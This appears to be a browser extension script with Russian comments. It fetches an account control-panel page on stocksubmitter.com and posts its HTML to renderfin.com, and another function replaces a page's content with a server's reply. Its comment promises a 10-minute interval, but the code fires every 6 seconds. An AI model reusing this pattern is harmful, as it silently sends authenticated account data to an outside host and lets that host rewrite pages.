function sendPageToServer(pageUrl, serverUrl) {
    // Формируем тело запроса, добавляя URL страницы перед HTML кодом страницы
    const requestBody = pageUrl + '<!--URL-->' + document.documentElement.outerHTML;

    fetch(serverUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'text/html',
        },
        body: requestBody,
    })
    .then(response => response.text())
    .then(html => {
        // Заменяем весь HTML документа на полученный ответ
        document.documentElement.innerHTML = html;
    })
    .catch(error => console.error('Error:', error));
}

// Функция для проверки страницы и отправки данных
function checkPageAndSend() {
    const pageUrl = 'https://accounts.stocksubmitter.com/cp/ingestionqueue';
    const serverUrl = 'https://renderfin.com/injesters';

    fetch(pageUrl)
    .then(response => response.text())
    .then(html => {
        // Создаем временный элемент для парсинга HTML
        const tempElement = document.createElement('html');
        tempElement.innerHTML = html;

        // Отправляем данные на сервер
        const requestBody = pageUrl + '<!--URL-->' + tempElement.outerHTML;
        fetch(serverUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'text/html',
            },
            body: requestBody,
        })
        .then(response => response.text())
        .then(serverResponse => {
            console.log('Server response:', serverResponse);
        })
        .catch(error => console.error('Error sending to server:', error));
    })
    .catch(error => console.error('Error fetching page:', error));
}

// Запускаем проверку каждые 10 минут (600000 миллисекунд)
setInterval(checkPageAndSend, 6000);

// Запускаем проверку сразу при загрузке расширения
checkPageAndSend();